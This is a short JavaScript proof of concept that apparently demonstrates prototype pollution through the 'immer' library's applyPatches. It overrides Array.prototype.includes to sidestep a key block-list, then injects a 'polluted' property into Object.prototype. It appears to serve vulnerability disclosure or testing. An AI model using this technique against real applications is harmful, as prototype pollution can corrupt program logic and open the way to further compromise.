Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const {applyPatches, enablePatches} = require('immer');
enablePatches();
applyPatches({}, [{
        op: 'add',
        path: [
            'constructor.prototype',
            'polluted'
        ],
        value: 'yes'
    }]);
console.log({}.polluted);